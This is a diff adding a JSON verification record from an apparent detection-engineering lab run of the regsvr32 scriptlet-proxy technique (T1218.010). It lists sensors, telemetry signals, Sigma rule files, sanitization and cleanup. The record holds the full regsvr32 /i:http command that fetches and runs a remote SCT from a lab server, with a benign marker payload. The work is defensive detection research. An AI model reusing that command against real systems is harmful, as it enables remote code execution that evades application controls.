@@ -1,0 +1,199 @@
+{
+  "scenario": {
+    "id": "regsvr32-remote-sct-marker",
+    "name": "Remote benign SCT execution through regsvr32 and scrobj.dll",
+    "description": "The signed regsvr32 utility retrieved a benign lab-only SCT whose JScript launched cmd.exe to write a marker file.",
+    "design": "scenarios.md",
+    "attack_mapping": [
+      "T1218.010"
+    ]
+  },
+  "environment": {
+    "target": {
+      "vmid": 104,
+      "name": "WIN10-ANALYSIS",
+      "address": "192.168.1.52",
+      "os": "Microsoft Windows 10 Enterprise LTSC Evaluation",
+      "version": "10.0.19044",
+      "architecture": "64-bit",
+      "baseline_snapshot": "win_verify_baseline"
+    },
+    "attacker_file_server": {
+      "vmid": 100,
+      "name": "kalivm",
+      "address": "192.168.1.50",
+      "interface_scope": "vmbr1 lab network only",
+      "server": "Python http.server",
+      "bind": "192.168.1.50",
+      "port": 18081,
+      "external_network_used": false
+    },
+    "nsm": {
+      "vmid": 106,
+      "name": "nsm",
+      "address": "10.9.0.20",
+      "analysis_mode": "offline pcap",
+      "helper": "~/bin/nsm-analyze",
+      "zeek_version": "8.2.1",
+      "suricata_version": "7.0.10",
+      "et_open_alert_rules": 52234
+    },
+    "proxmox_node": "analysis-proxmox",
+    "sensors": [
+      {
+        "name": "Sysmon",
+        "version": "15.21",
+        "service_status": "Running",
+        "config_path": "C:\\Tools\\sysmon-verification.xml",
+        "config_sha256": "5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71",
+        "config_notes": "Verification-grade unfiltered process, network, DNS, file, and registry coverage; LSASS ProcessAccess EID 10 enabled."
+      },
+      {
+        "name": "pktmon",
+        "mode": "full-packet capture",
+        "command": "pktmon.exe start --capture --pkt-size 0 -f C:\\lab\\regsvr32-remote-scriptlet.etl",
+        "converted_to": "C:\\lab\\regsvr32-remote-scriptlet.pcapng"
+      }
+    ],
+    "defender": {
+      "real_time_protection_enabled": false,
+      "tamper_protection_enabled": false
+    },
+    "collector": {
+      "path": "C:\\Tools\\collect-run.ps1",
+      "window_start": "2026-08-10T01:39:25.948Z",
+      "window_end": "2026-08-10T01:39:32.995Z",
+      "event_count": 1039
+    }
+  },
+  "tool": {
+    "name": "regsvr32.exe",
+    "type": "Microsoft-signed Windows living-off-the-land binary",
+    "source": "Built into the target operating system",
+    "binary": {
+      "path": "C:\\Windows\\System32\\regsvr32.exe",
+      "size_bytes": 25088,
+      "sysmon_file_version": "10.0.19041.1 (WinBuild.160101.0800)",
+      "original_filename": "REGSVR32.EXE",
+      "sha256": "022CB167A29A32DAE848BE91AEF721C74F1975AF151807DAFCC5ED832DB246B7",
+      "signature_status": "Valid",
+      "signer": "Microsoft Windows"
+    },
+    "staged_file": {
+      "name": "benign.sct",
+      "content": "Benign XML scriptlet whose JScript launches cmd.exe only to write a marker",
+      "size_bytes": 412,
+      "sha256": "D26EA6CBF6889670300D8E220054F4000A825E974FF263B4A360865D92094848"
+    },
+    "commands": [
+      {
+        "working_directory": "C:\\Windows\\System32",
+        "invocation": "C:\\Windows\\System32\\regsvr32.exe /s /n /u /i:http://192.168.1.50:18081/benign.sct scrobj.dll",
+        "account": "NT AUTHORITY\\SYSTEM",
+        "privilege": "System integrity",
+        "process_id": 5208,
+        "process_guid": "{d6daef74-2bd0-6a79-9300-000000000b00}",
+        "exit_code": 5,
+        "started_at": "2026-08-10T01:39:28.9484335Z",
+        "ended_at": "2026-08-10T01:39:29.9952831Z",
+        "intended_action_succeeded": true,
+        "marker_path": "C:\\lab\\regsvr32-marker.txt",
+        "marker_content": "benign-regsvr32-marker",
+        "exit_assessment": "The remote SCT executed and wrote its marker before regsvr32 returned 5 after taking the /u unregister path; the exact cause of that final code was not separately diagnosed."
+      }
+    ]
+  },
+  "observed_techniques": [
+    {
+      "id": "T1218.010",
+      "name": "System Binary Proxy Execution: Regsvr32",
+      "observation": "The signed regsvr32 binary fetched an SCT through scrobj.dll, initialized JScript, and spawned cmd.exe from the scriptlet."
+    }
+  ],
+  "observed_signals": {
+    "network": {
+      "status": "observed",
+      "event_id_3": 1,
+      "event_id_22": 0,
+      "pcapng_sha256": "EF4ED89FA2C6B9A6C5787EC8FA37AC3D2C9D17CBDCD1564367407E673E256C3F",
+      "packet_count": 102,
+      "capture_loss_percent": 0.0,
+      "zeek_http_records": 1,
+      "assessment": "Sysmon linked the TCP connection to regsvr32. Zeek and Suricata decoded a successful SCT GET with the legacy MSIE 7.0/Trident 7.0 User-Agent. DNS was absent because the URL used an IP literal."
+    },
+    "files": {
+      "status": "observed",
+      "event_id_11_relevant": 2,
+      "assessment": "Regsvr32 wrote the SCT to the SYSTEM INetCache and its cmd.exe child wrote the marker."
+    },
+    "registry": {
+      "status": "observed",
+      "event_id_12_relevant": 12,
+      "event_id_13_relevant": 14,
+      "event_id_14_relevant": 0,
+      "assessment": "The strongest registry signal was JScriptSetScriptStateStarted beneath Windows Script telemetry for regsvr32.exe; generic Internet Settings and notification writes were not promoted alone."
+    },
+    "process_identity": {
+      "status": "observed",
+      "event_id_1": 1,
+      "assessment": "Sysmon captured regsvr32 identity, hashes, remote /i URL, scrobj.dll, SYSTEM user, and System integrity."
+    },
+    "parent_child": {
+      "status": "observed",
+      "assessment": "PowerShell launched regsvr32 through the lab wrapper, and the scriptlet caused regsvr32 to launch cmd.exe directly."
+    }
+  },
+  "evidence": [
+    {
+      "path": "evidence/endpoint-signals.json",
+      "event_ids": [1, 3, 11, 12, 13],
+      "description": "Sanitized process, ancestry, endpoint network, file, and registry fields."
+    },
+    {
+      "path": "evidence/network-signals.json",
+      "description": "Sanitized full-packet capture metadata and Zeek/Suricata HTTP findings."
+    }
+  ],
+  "sigma": [
+    {"path": "sigma/win_process_creation_regsvr32_remote_scriptlet.yml", "tier": 1, "role": "primary", "logsource": "windows/process_creation", "status": "experimental"},
+    {"path": "sigma/win_process_creation_regsvr32_spawns_shell.yml", "tier": 1, "role": "parent-child", "logsource": "windows/process_creation", "status": "experimental"},
+    {"path": "sigma/network_zeek_regsvr32_remote_sct.yml", "tier": 1, "role": "network", "logsource": "zeek/http", "status": "experimental"},
+    {"path": "sigma/network_suricata_regsvr32_remote_sct.yml", "tier": 1, "role": "network", "logsource": "suricata/http", "status": "experimental"},
+    {"path": "sigma/win_file_event_regsvr32_sct_cache.yml", "tier": 1, "role": "file", "logsource": "windows/sysmon/file_event", "status": "experimental"},
+    {"path": "sigma/win_registry_set_regsvr32_jscript_telemetry.yml", "tier": 2, "role": "registry-depth", "logsource": "windows/sysmon/registry_set", "status": "experimental"}
+  ],
+  "validation": {
+    "pysigma": "All six Sigma rules parsed successfully with pySigma 1.5.0 on 2026-08-10.",
+    "json": "verification.json and both sanitized evidence JSON files passed JSON validation on 2026-08-10."
+  },
+  "sanitization": {
+    "raw_pcap_committed": false,
+    "raw_evtx_committed": false,
+    "raw_event_export_committed": false,
+    "raw_nsm_logs_committed": false,
+    "host_data_committed": false,
+    "notes": "Only selected telemetry fields, hashes, timestamps, aggregate counts, lab topology values, and benign marker content are committed."
+  },
+  "cleanup_confirmation": {
+    "attacker": {
+      "confirmed_at": "2026-08-10T01:41:19.295190191Z",
+      "http_service": "inactive",
+      "served_directory_present": false,
+      "port_18081_listener_present": false
+    },
+    "target": {
+      "snapshot": "win_verify_baseline",
+      "rollback_task_exit": "OK",
+      "rollback_confirmed_at": "2026-08-10T01:41:33.7856144Z",
+      "final_batch_baseline_confirmed_at": "2026-08-10T01:59:57.9788856Z",
+      "sysmon_service": "Running",
+      "sysmon_config_sha256": "5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71",
+      "defender_real_time_protection_enabled": false,
+      "marker_present": false,
+      "pcap_present": false,
+      "telemetry_directory_present": false
+    }
+  },
+  "verified_at": "2026-08-10T01:39:29.9952831Z",
+  "verifier": "Codex lab orchestrator"
+}
